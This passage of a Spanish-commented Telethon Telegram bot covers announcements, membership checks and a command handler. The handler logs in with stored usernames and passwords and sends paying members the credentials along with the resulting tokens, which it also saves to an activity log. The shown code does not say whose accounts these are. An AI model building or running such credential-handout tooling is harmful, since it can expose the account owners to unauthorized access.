        await event.reply(f"❌ No se encontró a @{admin_a_quitar} entre los administradores, o es el CEO.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Anunciar a todos los usuarios con membresía (/anunciar)
@client.on(events.NewMessage(pattern=r'/anunciar\s+(.+)'))
@solo_chats_privados
@anti_spam
async def anunciar(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ No tienes permiso para enviar anuncios.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @Asteriscom")
        return
    mensaje_anuncio = event.pattern_match.group(1)
    # Se envía el mensaje a todos los usuarios que tengan membresía activa
    destinatarios = list(permisos.keys())
    if not destinatarios:
        await event.reply("❌ No se encontraron usuarios con membresía activa.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    for user in destinatarios:
        try:
            await client.send_message(f"@{user}", f"📢 Anuncio:\n\n{mensaje_anuncio}")
        except Exception as e:
            print(f"Error al enviar anuncio a @{user}: {str(e)}")
    await event.reply("✅ Anuncio enviado")

# ---------------- COMANDO PARA USUARIOS: CONSULTA DE MI MEMBRESÍA ----------------

@client.on(events.NewMessage(pattern=r'/miembro'))
@solo_chats_privados
@anti_spam
async def consultar_membresia_usuario(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in permisos:
        await event.reply("❌ No tienes una membresía activa.")
        return
    tiempo_restante = permisos[username] - datetime.now()
    dias = tiempo_restante.days
    segundos = tiempo_restante.seconds
    horas = segundos // 3600
    minutos = (segundos % 3600) // 60
    await event.reply(f"👤 @{username}, tu membresía expira en {dias} días, {horas} horas y {minutos} minutos.")

# ---------------- MANEJO DE COMANDOS REGISTRADOS (GLOBAL y PERSONAL) ----------------

@client.on(events.NewMessage(pattern=r'/([a-zA-Z0-9_]+)'))
@solo_chats_privados
@anti_spam
async def manejar_comando(event):
    comando = event.pattern_match.group(1)
    sender = await event.get_sender()
    username = sender.username

    # Primero se revisa si el comando existe en los comandos globales (admin)
    if comando in URLS:
        datos = URLS[comando]
        # Verificamos si la contraseña contiene '%'
        if "%" in datos["clave"]:
            await event.reply("Usuario Innacesible prueba otro")
            return
        if username in admins or (username in permisos and permisos[username] > datetime.now()):
            token = await obtener_token(datos["usuario"], datos["clave"])
            if token:
                estado = "Exitoso✅"
                key = f"{datos['usuario']}:{datos['clave']}"
                if key not in actividad:
                    actividad[key] = {"usuario": datos["usuario"], "clave": datos["clave"], "token": token, "estado": estado}
                    guardar_actividad()
            else:
                estado = "Fallido❌"
            await event.reply(
                formatear_respuesta_token(datos["usuario"], datos["clave"], token, estado),
                buttons=crear_botones_urls(),
                parse_mode='markdown'
            )
        else:
            await event.reply("❌ No tienes permisos o tu membresía ha caducado.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        # Luego se revisa si el comando está en los comandos personalizados del usuario
        if username in comandos_usuario and comando in comandos_usuario[username]:
            datos = comandos_usuario[username][comando]
            if "%" in datos["clave"]:
                await event.reply("Usuario Innacesible prueba otro")
                return
            token = await obtener_token(datos["usuario"], datos["clave"])
            if token:
                estado = "Exitoso✅"
                key = f"{datos['usuario']}:{datos['clave']}"
                if key not in actividad:
                    actividad[key] = {"usuario": datos["usuario"], "clave": datos["clave"], "token": token, "estado": estado}
                    guardar_actividad()
            else:
                estado = "Fallido❌"
            await event.reply(
                formatear_respuesta_token(datos["usuario"], datos["clave"], token, estado),
                buttons=crear_botones_urls(),
                parse_mode='markdown'
            )
        else:
            # Comando no registrado: se ignora
            pass

# ---------------- CONEXIÓN ----------------

async def main():
    while True:
        try:
            await client.start(PHONE_NUMBER)
            print("Bot conectado y funcionando.")
            await client.run_until_disconnected()
        except Exception as e:
            print(f"Error detectado: {e}. Reintentando en 5 segundos...")
            await asyncio.sleep(5)

crear_archivos_json()
cargar_datos()

with client:
    client.loop.run_until_complete(main())

